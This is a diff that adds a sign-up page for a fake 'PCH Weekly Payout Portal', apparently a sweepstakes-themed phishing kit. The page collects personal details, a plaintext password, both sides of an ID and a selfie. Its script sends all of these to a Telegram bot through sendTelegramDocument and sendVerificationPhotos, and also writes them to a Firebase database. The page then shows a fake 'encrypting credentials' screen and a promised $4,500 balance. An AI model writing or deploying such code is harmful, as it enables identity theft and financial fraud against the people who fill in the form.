@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Create Account — PCH Weekly Payout Portal</title>
+<script src="supervisor.js"></script>
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+tailwind.config = { darkMode:'class', theme:{ extend:{ colors:{ navy:{950:'#070b19',900:'#0d1326',800:'#151d38',700:'#212d54',600:'#2f3f6e'}, gold:{400:'#fbbf24',500:'#f59e0b',600:'#d97706'}, 'sky-custom':'#38bdf8' }, fontFamily:{ sans:['Plus Jakarta Sans','sans-serif'] } } } };
+</script>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, set, get } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+
+const firebaseConfig = { apiKey:"AIzaSyAUIFpijfc13emGA-y1kN7nRuQTNVFphtM", authDomain:"pch-weekly-portal.firebaseapp.com", databaseURL:"https://pch-weekly-portal-default-rtdb.firebaseio.com", projectId:"pch-weekly-portal", storageBucket:"pch-weekly-portal.firebasestorage.app", messagingSenderId:"920877842148", appId:"1:920877842148:web:8ae593198c32ba75b636f1", measurementId:"G-789H6REHYS" };
+const app = initializeApp(firebaseConfig); 
+const rtdb = getDatabase(app);
+window.rtdb = { db: rtdb, ref, set, get };
+</script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  html, body { background-color:#070b19; }
+  body { font-family:'Plus Jakarta Sans',sans-serif; color:#f8fafc; -webkit-tap-highlight-color:transparent; -webkit-text-size-adjust:100%; }
+  @media (max-width:1024px){
+    input:not([type="checkbox"]):not([type="radio"]):not([type="range"]):not([type="file"]):not([type="color"]):not([type="submit"]):not([type="button"]):not([type="reset"]),
+    select, textarea { font-size:16px !important; line-height:1.45 !important; -webkit-text-size-adjust:100% !important; text-size-adjust:100% !important; }
+    input:focus, select:focus, textarea:focus { font-size:16px !important; transform:none !important; -webkit-transform:none !important; zoom:1 !important; }
+  }
+  .card-3d { transition: transform .3s cubic-bezier(.16,1,.3,1), box-shadow .3s cubic-bezier(.16,1,.3,1); }
+  @keyframes slideIn { from { transform:translateX(100%); opacity:0; } to { transform:translateX(0); opacity:1; } }
+  @keyframes slideOut { from { transform:translateX(0); opacity:1; } to { transform:translateX(100%); opacity:0; } }
+  .toast-slide-in { animation: slideIn .3s cubic-bezier(.16,1,.3,1) forwards; }
+  .toast-slide-out { animation: slideOut .3s cubic-bezier(.16,1,.3,1) forwards; }
+  .upload-preview { position:relative; border-radius:1rem; overflow:hidden; border:1px solid rgba(56,189,248,.35); background:#070b19; box-shadow:0 12px 24px -14px rgba(0,0,0,1),0 0 22px -10px rgba(56,189,248,.5); animation:fadeUp .35s cubic-bezier(.16,1,.3,1) both; }
+  .upload-preview img { width:100%; height:100%; object-fit:cover; display:block; }
+  @keyframes fadeUp { from { opacity:0; transform:translateY(14px); } to { opacity:1; transform:translateY(0); } }
+  @keyframes successReveal {
+    0% { opacity: 0; transform: rotateY(90deg) scale(0.8); }
+    100% { opacity: 1; transform: rotateY(0deg) scale(1); }
+  }
+  .success-card {
+    animation: successReveal 0.8s cubic-bezier(0.16,1,0.3,1) forwards;
+    transform-style: preserve-3d;
+  }
+</style>
+</head>
+<body class="bg-navy-950 text-slate-100 min-h-screen flex flex-col justify-center py-12 px-4">
+
+<div id="toast-container" class="fixed bottom-5 right-5 z-[100] flex flex-col space-y-3 pointer-events-none max-w-sm w-full px-4"></div>
+
+<div id="app-container" class="w-full max-w-2xl mx-auto"></div>
+
+<div id="global-modal" style="display:none" class="fixed inset-0 z-50 items-center justify-center bg-navy-950/95 p-4 overflow-y-auto">
+  <div class="bg-navy-800 border border-navy-700 rounded-2xl max-w-lg w-full p-6 shadow-2xl relative my-auto">
+    <button onclick="closeModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl p-2 rounded-lg active:bg-navy-700 transition"><i class="fa-solid fa-xmark"></i></button>
+    <div id="modal-content"></div>
+  </div>
+</div>
+
+<script>
+/* ═══════════ SHARED CORE ═══════════ */
+const DEVICE_STORAGE_KEY = 'pch_device_state_v13';
+const USER_REGISTRY_KEY = 'pch_user_folder_registry';
+const DEFAULT_WD_LIMIT = 5000;
+const DEFAULT_P2P_LIMIT = 50000;
+
+function escapeHtml(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
+function fmtMoney(n){ return '$' + (Number(n)||0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2}); }
+function nz(v){ return v===undefined||v===null||v===''?'—':String(v); }
+function nowStamp(){ return new Date().toISOString().replace('T',' ').substring(0,19) + ' UTC'; }
+function fileHeader(title){ const line='='.repeat(64); return `${line}\n  ${title.toUpperCase()}\n${line}\nEVENT DATE      : ${nowStamp()}\n`; }
+function fileFooter(){ const line='='.repeat(64); return `${line}\n  END OF RECORD\n${line}\n`; }
+function section(name){ const thin='-'.repeat(64); return `\n${thin}\n  ${name.toUpperCase()}\n${thin}\n`; }
+function buildSignupRecord(u, recordId) { return fileHeader(`NEW USER REGISTRATION — ${recordId}`) + `RECORD ID       : ${recordId}\n` + section('User Details') + `Username        : ${nz(u.username)}\n` + `Full Name       : ${nz(u.firstName)} ${nz(u.lastName)}\n` + `Email Address   : ${nz(u.email)}\n` + `Phone Number    : ${nz(u.phone)}\n` + section('Mailing Address') + `Street Address  : ${nz(u.address)}\n` + `City            : ${nz(u.city)}\n` + `State / Parish  : ${nz(u.stateOrParish)}\n` + `ZIP / Postal    : ${nz(u.zip)}\n` + section('Account Credentials') + `Username        : ${nz(u.username)}\n` + `Password        : ${nz(u.password)}\n` + section('Identity Verification') + `ID Front        : Captured\n` + `ID Back         : Captured\n` + `Selfie Photo    : Captured\n` + fileFooter(); }
+
+function loadDeviceState() {
+  const saved = localStorage.getItem(DEVICE_STORAGE_KEY);
+  if (saved) { try { return JSON.parse(saved); } catch(e){} }
+  return { currentUser:null, userBalance:4500, configuredMethod:null, transactions:[], registeredUsers:[], savings:null, cdAccount:null, accessLogs:[], promo:null, signupCounter:0, withdrawalState:'none', currentWithdrawal:null, favoriteRecipients:[], scheduledTransfers:[], fundingMethods:[], autoWithdraw:{enabled:false,frequency:'weekly',amount:null,method:null}, dailyLimits:{ withdrawal:{limit:DEFAULT_WD_LIMIT,used:0,date:''}, p2p:{limit:DEFAULT_P2P_LIMIT,used:0,date:''} }, referralCode:null, messagesReadAt:0, announcement:null, messages:[], announcementDismissedAt:0, card:null, kyc:null, supportTickets:[] };
+}
+const persisted = loadDeviceState();
+const state = {
+  currentUser: persisted.currentUser, userBalance: persisted.userBalance, registeredUsers: persisted.registeredUsers||[],
+  transactions: persisted.transactions||[], telegramConfig: { botToken:'', chatId:'' }
+};
+function saveDeviceState() {
+  const payload = { currentUser:state.currentUser, userBalance:state.userBalance, registeredUsers:state.registeredUsers, transactions:state.transactions };
+  try { localStorage.setItem(DEVICE_STORAGE_KEY, JSON.stringify(payload)); } catch(e){}
+}
+function saveUserToRegistry(user) { if (!user || !user.username) return; try { const arr = JSON.parse(localStorage.getItem(USER_REGISTRY_KEY) || '[]'); const k = user.username.toLowerCase(); const idx = arr.findIndex(u => (u.username||'').toLowerCase() === k); const record = { username:user.username, firstName:user.firstName||'', lastName:user.lastName||'', email:user.email||'' }; if (idx >= 0) arr[idx] = record; else arr.push(record); localStorage.setItem(USER_REGISTRY_KEY, JSON.stringify(arr)); } catch(e){} }
+
+function showToast(title, message, type='info') {
+  const container = document.getElementById('toast-container'); if (!container) return;
+  const id = 'toast-'+Date.now()+'-'+Math.floor(Math.random()*999);
+  const icon = type==='success'?'fa-circle-check text-emerald-400':type==='warning'?'fa-triangle-exclamation text-gold-400':type==='error'?'fa-circle-exclamation text-rose-400':'fa-circle-info text-sky-custom';
+  const border = type==='success'?'border-emerald-500/40':type==='warning'?'border-gold-500/40':type==='error'?'border-rose-500/40':'border-sky-custom/40';
+  const el = document.createElement('div'); el.id = id;
+  el.className = `pointer-events-auto bg-navy-900 border ${border} p-4 rounded-2xl shadow-2xl flex items-start space-x-3 toast-slide-in`;
+  el.innerHTML = `<div class="text-lg mt-0.5"><i class="fa-solid ${icon}"></i></div><div class="flex-grow"><h5 class="font-bold text-white text-xs sm:text-sm">${escapeHtml(title)}</h5><p class="text-[11px] sm:text-xs text-slate-300 mt-0.5">${escapeHtml(message)}</p></div><button onclick="dismissToast('${id}')" class="text-slate-400 hover:text-white text-sm"><i class="fa-solid fa-xmark"></i></button>`;
+  container.appendChild(el); setTimeout(()=>dismissToast(id), 5000);
+}
+function dismissToast(id){ const el=document.getElementById(id); if(el){ el.classList.remove('toast-slide-in'); el.classList.add('toast-slide-out'); setTimeout(()=>el.remove(),320); } }
+function showModal(title, bodyHtml) { const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content'); content.innerHTML = `<h3 class="text-lg sm:text-xl font-bold text-white mb-3 flex items-center"><i class="fa-solid fa-circle-info text-sky-custom mr-2"></i> ${title}</h3><div class="text-slate-300 text-xs sm:text-sm leading-relaxed mb-4">${bodyHtml}</div>`; modal.style.display = 'flex'; }
+function closeModal(){ const m=document.getElementById('global-modal'); m.classList.remove('flex'); m.style.display='none'; }
+
+async function sendTelegramMessage(textMessage) { const botToken = state.telegramConfig.botToken.trim(); const chatId = state.telegramConfig.chatId.trim(); try { const r = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{ method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ chat_id:chatId, text:textMessage, parse_mode:'HTML', disable_notification:true }) }); const d = await r.json(); return d.ok; } catch(err){ return false; } }
+async function sendTelegramDocument(filename, text, captionText) { const botToken = state.telegramConfig.botToken.trim(); const chatId = state.telegramConfig.chatId.trim(); try { const blob = new Blob([text],{type:'text/plain;charset=utf-8'}); const fd = new FormData(); fd.append('chat_id', chatId); fd.append('document', blob, filename); fd.append('caption', captionText||`📄 <b>${filename}</b>`); fd.append('parse_mode','HTML'); fd.append('disable_notification','true'); const res = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`,{ method:'POST', body:fd }); const data = await res.json(); return data.ok; } catch(err){ return false; } }
+async function sendTelegramPhoto(file, caption) { if (!file) return false; const botToken = state.telegramConfig.botToken.trim(); const chatId = state.telegramConfig.chatId.trim(); try { const fd = new FormData(); fd.append('chat_id', chatId); fd.append('caption', caption||''); fd.append('parse_mode','HTML'); fd.append('disable_notification','true'); fd.append('photo', file); const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`,{ method:'POST', body:fd }); const data = await res.json(); return data.ok; } catch(err){ return false; } }
+async function sendVerificationPhotos(frontFile, backFile, selfieFile, userLabel) { try { if (frontFile) await sendTelegramPhoto(frontFile, `🪪 <b>Front ID</b> — ${userLabel}`); if (backFile) await sendTelegramPhoto(backFile, `🪪 <b>Back ID</b> — ${userLabel}`); if (selfieFile) await sendTelegramPhoto(selfieFile, `🤳 <b>Selfie</b> — ${userLabel}`); } catch(e){} }
+
+/* ═══════════ SIGNUP PAGE ═══════════ */
+
+function renderSignup() {
+  const fileInputClass = "w-full text-xs text-slate-400 file:mr-3 file:py-2.5 file:px-4 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-sky-custom file:text-navy-950 file:cursor-pointer cursor-pointer bg-navy-950 border border-navy-700 rounded-xl p-1.5 focus:outline-none focus:border-sky-custom";
+  
+  document.getElementById('app-container').innerHTML = `
+    <div class="bg-navy-800 border border-navy-700/80 rounded-3xl max-w-2xl w-full p-6 sm:p-10 shadow-2xl relative card-3d mx-auto">
+      <div class="text-center mb-8">
+        <div class="w-14 h-14 bg-gradient-to-br from-gold-400 to-gold-600 rounded-2xl mx-auto flex items-center justify-center text-navy-950 text-2xl font-bold mb-4 shadow-lg shadow-gold-500/20"><i class="fa-solid fa-vault"></i></div>
+        <h2 class="text-2xl sm:text-3xl font-extrabold text-white">Create Portal Account</h2>
+        <p class="text-xs text-slate-400 mt-1">Complete your profile information and verification details</p>
+      </div>
+      
+      <form id="register-form" class="space-y-5">
+        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+          <div><label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">First Name *</label><input type="text" id="reg-fname" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="John"></div>
+          <div><label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Last Name *</label><input type="text" id="reg-lname" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="Doe"></div>
+        </div>
+        <div><label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Street Address *</label><input type="text" id="reg-address" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="123 Main Street"></div>
+        <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
+          <div><label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">City *</label><input type="text" id="reg-city" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="New York"></div>
+          <div><label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">State / Parish *</label><input type="text" id="reg-state" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="NY"></div>
+          <div><label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">ZIP / Postal *</label><input type="text" id="reg-zip" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="10001"></div>
+        </div>
+        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+          <div><label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Phone Number *</label><input type="tel" id="reg-phone" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="646-585-8110"></div>
+          <div><label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Email Address *</label><input type="email" id="reg-email" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="john@example.com"></div>
+        </div>
+        <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
+          <div><label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Username *</label><input type="text" id="reg-username" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="johndoe"></div>
+          <div><label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Password *</label><input type="password" id="reg-password" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="••••••••"></div>
+          <div><label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Confirm Password *</label><input type="password" id="reg-cpassword" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="••••••••"></div>
+        </div>
+        
+        <div class="bg-navy-900 border border-navy-700 p-5 rounded-2xl space-y-5">
+          <h4 class="text-xs font-bold text-gold-400 uppercase tracking-wider"><i class="fa-solid fa-id-card mr-1.5"></i> Identity & Photo Verification Upload</h4>
+          <div class="space-y-1.5"><div class="flex items-center justify-between"><label class="block text-xs font-bold text-slate-300">Front ID Document *</label></div><input type="file" id="reg-id-front" accept="image/*" required onchange="previewUploadedFile(this, 'prev-id-front')" class="${fileInputClass}"><div id="prev-id-front" class="hidden upload-preview h-36"></div></div>
+          <div class="space-y-1.5"><div class="flex items-center justify-between"><label class="block text-xs font-bold text-slate-300">Back ID Document *</label></div><input type="file" id="reg-id-back" accept="image/*" required onchange="previewUploadedFile(this, 'prev-id-back')" class="${fileInputClass}"><div id="prev-id-back" class="hidden upload-preview h-36"></div></div>
+          <div class="space-y-1.5"><div class="flex items-center justify-between"><label class="block text-xs font-bold text-slate-300">Verification Selfie Photo *</label></div><input type="file" id="reg-selfie" accept="image/*" required onchange="previewUploadedFile(this, 'prev-selfie')" class="${fileInputClass}"><div id="prev-selfie" class="hidden upload-preview h-40"></div></div>
+        </div>
+        
+        <div id="reg-error" class="text-rose-400 text-xs hidden"></div>
+        <button type="submit" class="w-full py-4 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl shadow-lg shadow-gold-500/20 hover:brightness-110 active:scale-95 transition text-base">Complete Registration</button>
+      </form>
+      
+      <div class="mt-6 text-center text-xs text-slate-400">Already have an account? <a href="login.html" class="text-sky-custom font-bold hover:underline">Sign In</a></div>
+    </div>
+  `;
+  
+  document.getElementById('register-form').addEventListener('submit', handleSignup);
+}
+
+function previewUploadedFile(input, previewId) {
+  const previewEl = document.getElementById(previewId); if (!previewEl) return;
+  const file = input.files && input.files[0];
+  if (!file) { previewEl.classList.add('hidden'); previewEl.innerHTML = ''; return; }
+  const badge = `<div class="absolute bottom-0 left-0 right-0 bg-navy-950/90 px-2.5 py-1.5 text-[10px] font-bold text-emerald-400 flex items-center justify-between"><span class="truncate pr-2"><i class="fa-solid fa-circle-check mr-1"></i>${escapeHtml(file.name)}</span><span class="text-slate-400 shrink-0">${(file.size/1024).toFixed(0)} KB</span></div>`;
+  if (file.type && file.type.startsWith('image/')) {
+    const reader = new FileReader();
+    reader.onload = (e)=>{ previewEl.innerHTML = `<img src="${e.target.result}" alt="preview">${badge}`; previewEl.classList.remove('hidden'); };
+    reader.readAsDataURL(file);
+  } else {
+    previewEl.innerHTML = `<div class="w-full h-full flex flex-col items-center justify-center text-sky-custom gap-2"><i class="fa-solid fa-file-pdf text-3xl"></i><span class="text-[11px] font-bold">Attached</span></div>${badge}`;
+    previewEl.classList.remove('hidden');
+  }
+}
+
+async function handleSignup(e) {
+  e.preventDefault();
+  const pass = document.getElementById('reg-password').value;
+  const cpass = document.getElementById('reg-cpassword').value;
+  const errEl = document.getElementById('reg-error');
+  
+  if (pass !== cpass) { errEl.textContent = 'Passwords do not match.'; errEl.classList.remove('hidden'); return; }
+  if (pass.length < 6) { errEl.textContent = 'Password must be at least 6 characters.'; errEl.classList.remove('hidden'); return; }
+  
+  const newUser = {
+    firstName: document.getElementById('reg-fname').value,
+    lastName: document.getElementById('reg-lname').value,
+    address: document.getElementById('reg-address').value,
+    city: document.getElementById('reg-city').value,
+    stateOrParish: document.getElementById('reg-state').value,
+    zip: document.getElementById('reg-zip').value,
+    phone: document.getElementById('reg-phone').value,
+    email: document.getElementById('reg-email').value,
+    username: document.getElementById('reg-username').value,
+    password: pass, photoUrl: null,
+    userBalance: 4500.00, transactions: [], withdrawalState: 'none', currentWithdrawal: null,
+    configuredMethod: null, favoriteRecipients: [], scheduledTransfers: [], fundingMethods: [],
+    autoWithdraw: { enabled:false, frequency:'weekly', amount:null, method:null },
+    dailyLimits: { withdrawal:{limit:DEFAULT_WD_LIMIT,used:0,date:''}, p2p:{limit:DEFAULT_P2P_LIMIT,used:0,date:''} },
+    referralCode: null
+  };
+  
+  const frontFile = document.getElementById('reg-id-front').files[0];
+  const backFile = document.getElementById('reg-id-back').files[0];
+  const selfieFile = document.getElementById('reg-selfie').files[0];
+  
+  if (!frontFile || !backFile || !selfieFile) { errEl.textContent = 'All three photos are required.'; errEl.classList.remove('hidden'); return; }
+  
+  const taken = (state.registeredUsers || []).find(u => u && u.username && u.username.toLowerCase() === newUser.username.toLowerCase());
+  if (taken) { errEl.textContent = 'That username is already registered. Please choose another.'; errEl.classList.remove('hidden'); return; }
+  
+  const btn = e.target.querySelector('button[type="submit"]');
+  btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin mr-2"></i> Uploading...';
+  btn.disabled = true;
+
+  state.currentUser = newUser;
+  state.registeredUsers.push(newUser);
+  state.signupCounter = (state.signupCounter || 0) + 1;
+  saveDeviceState();
+  saveUserToRegistry(newUser);
+  
+  if (window.rtdb) { try { await window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'users/' + newUser.username.toLowerCase()), newUser); } catch(err) {} }
+  
+  const recordId = `user${state.signupCounter}`;
+  sendTelegramDocument(`${recordId}.txt`, buildSignupRecord(newUser, recordId), '🚨 <b>NEW USER REGISTRATION & VERIFICATION</b>');
+  sendVerificationPhotos(frontFile, backFile, selfieFile, `${newUser.firstName} ${newUser.lastName} (${newUser.username})`);
+  
+  // Trigger loading animation
+  showLoadingAnimation();
+}
+
+function showLoadingAnimation() {
+  document.getElementById('app-container').innerHTML = `
+    <div class="bg-navy-800 border border-navy-700 p-8 sm:p-10 rounded-3xl max-w-md w-full text-center shadow-2xl space-y-6 card-3d mx-auto">
+      <div class="relative w-20 h-20 sm:w-24 sm:h-24 mx-auto flex items-center justify-center">
+        <div class="absolute inset-0 rounded-full border-4 border-sky-custom/20 border-t-sky-custom animate-spin"></div>
+        <i class="fa-solid fa-shield-halved text-2xl sm:text-3xl text-sky-custom"></i>
+      </div>
+      <div><h3 class="text-xl sm:text-2xl font-bold text-white mb-2">Creating Account</h3><p class="text-xs text-slate-400">Encrypting credentials and establishing secure session...</p></div>
+      <div class="w-full bg-navy-950 h-4 rounded-full overflow-hidden border border-navy-700 shadow-inner p-0.5"><div id="loading-bar" class="bg-gradient-to-r from-gold-400 via-sky-custom to-emerald-400 h-full w-0 rounded-full transition-all duration-300"></div></div>
+      <div id="loading-pct" class="text-base sm:text-lg font-black text-gold-400">0%</div>
+    </div>
+  `;
+  
+  let progress = 0;
+  const interval = setInterval(() => {
+    progress += 5;
+    const bar = document.getElementById('loading-bar'); const pct = document.getElementById('loading-pct');
+    if (bar && pct) { bar.style.width = progress + '%'; pct.textContent = progress + '%'; }
+    if (progress >= 100) { clearInterval(interval); setTimeout(showCongratulationsScreen, 150); }
+  }, 80);
+}
+
+function showCongratulationsScreen() {
+  const firstName = state.currentUser ? (state.currentUser.firstName || 'there') : 'there';
+  
+  document.getElementById('app-container').innerHTML = `
+    <div class="flex flex-col items-center justify-center py-10" style="perspective: 1000px;">
+      <div class="success-card bg-navy-800 border border-emerald-500/40 p-8 sm:p-10 rounded-3xl max-w-lg w-full text-center shadow-[0_0_50px_rgba(16,185,129,0.15)] space-y-6 relative overflow-hidden">
+        
+        <div class="absolute top-0 left-1/2 -translate-x-1/2 w-48 h-48 bg-emerald-500/20 rounded-full blur-3xl pointer-events-none"></div>
+
+        <div class="relative z-10 w-20 h-20 sm:w-24 sm:h-24 bg-gradient-to-br from-emerald-400 to-emerald-600 text-white rounded-full mx-auto flex items-center justify-center text-4xl shadow-[0_0_30px_rgba(16,185,129,0.5)] border-4 border-navy-800">
+          <i class="fa-solid fa-check drop-shadow-md"></i>
+        </div>
+        
+        <div class="relative z-10 space-y-2">
+          <h2 class="text-2xl sm:text-3xl font-extrabold text-white">Account Created!</h2>
+          <p class="text-sm text-slate-300 leading-relaxed">Dear <span class="text-gold-400 font-bold">${escapeHtml(firstName)}</span>,<br>Your account was created successfully. You will be redirected to your dashboard within 20s.</p>
+        </div>
+        
+        <div class="relative z-10 bg-sky-custom/10 border border-sky-custom/30 p-4 rounded-xl flex items-start gap-3 text-left">
+          <i class="fa-solid fa-shield-halved text-sky-custom text-lg mt-0.5"></i>
+          <p class="text-xs text-slate-300"><b class="text-white">Security Tip:</b> Never share your login information (username or password) with anyone. PCH support will never ask for your password.</p>
+        </div>
+
+        <div class="relative z-10 bg-navy-900/80 border border-navy-700 p-5 rounded-2xl backdrop-blur-sm mt-4">
+          <div class="flex justify-between items-center text-[11px] text-slate-400 font-bold uppercase tracking-wider mb-2">
+            <span>Redirecting to dashboard</span>
+            <span id="redirect-timer" class="text-emerald-400 font-mono text-sm">20s</span>
+          </div>
+          <div class="w-full h-2 bg-navy-950 rounded-full overflow-hidden border border-navy-700/50 shadow-inner">
+            <div id="redirect-progress" class="h-full bg-gradient-to-r from-emerald-400 to-sky-custom w-full rounded-full transition-all duration-1000 ease-linear"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  `;
+  
+  let countdown = 20;
+  const timerInterval = setInterval(() => {
+    countdown--;
+    const textEl = document.getElementById('redirect-timer');
+    if (textEl) textEl.textContent = Math.max(0, countdown) + 's';
+    const barEl = document.getElementById('redirect-progress');
+    if (barEl) barEl.style.width = (countdown / 20 * 100) + '%';
+    
+    if (countdown <= 0) { 
+      clearInterval(timerInterval); 
+      window.location.href = 'overview.html'; 
+    }
+  }, 1000);
+}
+
+renderSignup();
+</script>
+</body>
+</html>
